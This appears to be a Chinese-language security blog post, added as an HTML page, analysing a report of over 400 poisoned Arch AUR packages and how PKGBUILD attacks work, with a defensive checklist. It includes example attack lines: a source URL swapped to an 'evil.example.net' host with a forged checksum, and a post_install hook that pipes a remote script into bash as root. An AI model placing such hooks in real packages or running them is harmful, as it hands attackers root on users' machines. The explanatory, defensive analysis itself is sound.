@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AUR 一次性发现 400+ 恶意包：PKGBUILD 投毒攻击面全拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>AUR 一次性发现 400+ 恶意包：PKGBUILD 投毒攻击面全拆解</h1>
+<time>2026-06-14</time>
+<ul>
+<li>安全</li>
+<li>供应链攻击</li>
+<li>Arch Linux</li>
+<li>AUR</li>
+<li>开源</li>
+</ul>
+<hr />
+<blockquote>
+<p>2026年6月14日 · 深度技术研究</p>
+</blockquote>
+<hr />
+<h2>导语</h2>
+<p>6 月中旬，安全研究者公开了一份扫描结果：Arch Linux 的 AUR（Arch User Repository）里一次性发现超过 400 个被植入恶意代码的包，随后几天社区又报告了"新一轮"投毒。</p>
+<p>400 这个数字本身不算惊人，PyPI、npm 每个月都能扫出几百个。但 AUR 的情况值得单独拆一篇，因为它的信任模型和 npm/PyPI 完全不同：AUR 没有中心化的包管理公司，没有二进制签名，没有自动化扫描，安全几乎完全靠"装包的人自己看一眼"。理解它的攻击面，比记住一个数字有用得多。</p>
+<h2>AUR 的信任模型：源码即信任，签名缺席</h2>
+<p>AUR 不是一个二进制仓库。它的每个"包"是一个 git 仓库，里面通常只有一个 PKGBUILD（外加可选的 .install、补丁、.SRCINFO 元数据）。用户侧的 makepkg 读 PKGBUILD，按 source=() 数组去下载真正的上游源码，在本地编译，最后 pacman -U 安装本地生成的包。全库规模大约 9 万个包，绝大多数只有一个维护者。</p>
+<p>官方仓库（core/extra/community）的安全建立在 GPG 签名的二进制包上；AUR 什么都没有。PKGBUILD 是纯文本的 bash 脚本，它说下载什么就下载什么，说执行什么就执行什么。所谓社区审查，就是装之前"有个人看了一眼"，而投票和评论区是唯一的反馈渠道。攻击者需要的只是一次看起来合理的"更新"。</p>
+<p>这里有个关键误区要先破除：<strong>完整性校验在 AUR 里是纸糊的</strong>。PKGBUILD 里确实有 sha256sums=()，但校验值跟着 PKGBUILD 一起分发。攻击者把 source 换成自己的服务器，再把 sha256sums 同步改成恶意 tarball 的哈希，校验照样通过。信任链条是"PKGBUILD 作者 → 上游 URL → 校验值"，三段全在攻击者手里，校验只是自欺欺人。</p>
+<h2>攻击手法拆解</h2>
+<h3>1. source 偷换 + 校验值同步伪造</h3>
+<p>最直白的一种。正常包长这样：</p>
+<div class="highlight"><pre><span></span><code><span class="nv">source</span><span class="o">=(</span><span class="s2">&quot;https://example.com/foo/foo-1.0.tar.gz&quot;</span><span class="o">)</span>
+<span class="nv">sha256sums</span><span class="o">=(</span><span class="s1">&#39;a3f2c9...&#39;</span><span class="o">)</span>
+</code></pre></div>
+
+<p>恶意版把 URL 换到攻击者域名，sha256sums 跟着换成恶意文件的哈希：</p>
+<div class="highlight"><pre><span></span><code><span class="nv">source</span><span class="o">=(</span><span class="s2">&quot;https://cdn.evil.example.net/foo-1.0.tar.gz&quot;</span><span class="o">)</span>
+<span class="nv">sha256sums</span><span class="o">=(</span><span class="s1">&#39;9f0c4b...&#39;</span><span class="o">)</span><span class="w">   </span><span class="c1"># 恶意 tarball 的哈希</span>
+</code></pre></div>
+
+<p>变量名一个没变，变的只是字符串，快速扫 diff 很难察觉。自动化扫描也是靠这类特征：source 域名陌生、与上游公开的下载地址不一致、哈希对不上官方值。</p>
+<h3>2. .install 脚本：以 root 执行的隐藏面</h3>
+<p>AUR 包可以带一个 .install 文件，PKGBUILD 用 install=foo.install 把它绑进包。pacman 在安装、升级、卸载时以 root 执行里面的 pre_install / post_install / pre_upgrade / post_upgrade 函数。这是投毒者最喜欢的落点，因为它在编译阶段之外，用户看到的终端输出几乎全是 pacman 的正常进度条：</p>
+<div class="highlight"><pre><span></span><code>post_install<span class="o">()</span><span class="w"> </span><span class="o">{</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>http://evil.example.net/x.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+<span class="w">  </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>--now<span class="w"> </span>foo-updater.service
+<span class="o">}</span>
+</code></pre></div>
+
+<p>更隐蔽的写法是往 root 的 ~/.ssh/authorized_keys 里追加公钥，或者写一个伪装成系统服务的 unit，文件塞进 /usr/lib/systemd/system/ 和 /etc/systemd/system/ 各一份，用户排查时看到"两个 unit 文件"会以为是打包规范。注意一个常见错觉：makepkg 本身以普通用户跑，但 pacman 安装阶段是 root，所以"我在本地编译的，应该安全"不成立，恶意代码在 install 阶段照样拿 root。</p>
+<h3>3. 孤儿包接管：最难防守的场景</h3>
+<p>AUR 允许维护者 disown 自己的包，包进入 orphan 状态后，任何人可以申请接管，几天无异议就通过。攻击流程是标准的三步：</p>
+<ol>
+<li>盯一个用户量大、维护者已弃坑的包（AUR 上这种包非常多，网页有 Orphan 列表）</li>
+<li>申请接管，等审核窗口过去</li>
+<li>推一个"例行升级"：版本号 +1、顺手重构 build()，后门藏在 .install 或补丁里</li>
+</ol>
+<p>2018 年 AUR 的 php 包事件走的就是这条路径：包被恶意接管后发布的版本里带着后门，栽了不少人。防御上几乎无解，因为从社区视角看，有人接手没人管的包是好事。唯一能做的，是看接管后的第一次提交到底改了什么。</p>
+<h3>4. -git 包：把整个源码仓库换掉</h3>
+<p>AUR 里大量 -git 后缀的包，source 直接指向上游 git 仓库，pkgver() 在构建时跑 git describe 生成版本号。这类包有两个天然特性让审查失效：</p>
+<ul>
+<li>每次构建内容都可能不同，diff 审查无从谈起</li>
+<li>版本号乱跳，看起来像正常的滚动更新</li>
+</ul>
+<p>投毒版只需把 source 指向攻击者的 fork，git 历史可以伪造得和上游一模一样，只在某个提交里加一行。而普通用户根本不会去 diff 两个 git 仓库。</p>
+<h3>5. 伪装与依赖混淆</h3>
+<p>最后是命名层面的：typosquat 流行包名，或者提供 foo-bin、foo-git 这类变体，让 AUR helper 在解析依赖时把恶意包当依赖拉进来。makedepends 同样可以下毒：构建时"需要"的某个工具实际是同名恶意包，在 build() 阶段执行任意代码。</p>
+<h2>为什么批量发现这么晚</h2>
+<p>AUR 没有中央代码扫描，没有依赖图审计，甚至没有强制要求 PKGBUILD 与上游发布物哈希一致。研究者的做法是拉全量 AUR git 镜像，然后静态扫特征：curl|bash、base64 -d、指向非官方域名的 source、install= 指向异常路径、build() 里写 /etc 或 /root 或 /home。特征匹配筛出几百个候选，再人工确认。</p>
+<p>这套方法不复杂，难的是没人长期干。商业安全公司的注意力在 npm、PyPI、Maven 这些有商业客户的生态上；AUR 是志愿者社区，既不赚钱也没有 SLA。400 这个数只是某个时间截面的静态扫描结果，动态投毒（装完再删、按 IP 区分 payload）是扫不出来的。</p>
+<h2>装 AUR 包，我的检查清单</h2>
+<p>实践上我分三层。</p>
+<p>第一层，能不用就不用。官方仓库和发行版二进制优先，AUR 只留给官方确实没有、且我确实需要的东西。</p>
+<p>第二层，装之前必须看 diff，别让 helper 一路回车。手动流程：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 拉取 PKGBUILD（不构建）</span>
+paru<span class="w"> </span>-G<span class="w"> </span>&lt;pkg&gt;
+<span class="c1"># 或 git clone https://aur.archlinux.org/&lt;pkg&gt;.git</span>
+
+<span class="c1"># 查三样东西：source 域名、校验值、install 指向的 .install</span>
+grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;^(source|sha256sums|install)=&#39;</span><span class="w"> </span>PKGBUILD
+cat<span class="w"> </span>.install<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<p>重点不是看哈希对不对，而是看 source 的域名是不是该项目真正的官方域名。升级时先 git log 看这次改动；orphan 刚被接管的包，重点看接手后的第一个 commit。</p>
+<p>第三层，沙箱里构建。用官方 devtools 在干净 chroot 里编，PKGBUILD 碰不到家目录：</p>
+<div class="highlight"><pre><span></span><code>makechrootpkg<span class="w"> </span>-c<span class="w"> </span>-r<span class="w"> </span>/var/lib/archbuild
+</code></pre></div>
+
+<p>namcap 可以做静态 lint，能抓一部分危险调用，但别当银弹。对要长期用的包，我装完会把 PKGBUILD 和 .install 存档，之后每次升级先 diff 存档再决定。</p>
+<p>一句话总结：AUR 的问题不是"开源不可信"，而是它的信任模型把审查成本全转嫁给了装包的人，而 99% 的人没时间做。400 个恶意包只是一个静态扫描截面，真正的教训是：任何"源码即信任、无签名、无扫描"的生态，投毒只是时间问题。</p>
+<h2>⚠️ 网络安全免责声明</h2>
+<p>本文内容仅供技术研究与安全学习之用。文中描述的漏洞分析、攻击链拆解和代码示例均基于公开披露的安全研究，旨在帮助开发者理解攻击原理、提升安全意识和防御能力。</p>
+<p>请勿将本文所述技术用于任何未经授权的安全测试、渗透攻击或非法用途。任何因滥用本文信息而造成的法律后果，由使用者自行承担，与本文作者无关。</p>
+<p>如发现系统安全漏洞，请通过合法渠道向相关厂商或平台报告，共同维护网络安全生态。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
